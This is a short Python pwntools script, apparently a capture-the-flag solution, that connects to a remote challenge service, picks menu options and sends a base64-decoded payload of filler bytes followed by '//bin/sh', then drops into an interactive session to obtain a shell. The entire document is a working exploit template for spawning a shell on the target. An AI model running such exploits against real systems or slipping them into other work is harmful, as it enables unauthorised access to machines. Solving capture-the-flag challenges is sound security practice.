from pwn import *
import base64

#p = process('./chall')
p = remote(ADDRESS, PORT)
payload = b"YWFh" * 16 + b"//bin/sh"
p.sendlineafter(b"> ", b"1")
p.send(base64.b64decode(payload))
p.sendlineafter(b"> ", b"2")
p.interactive()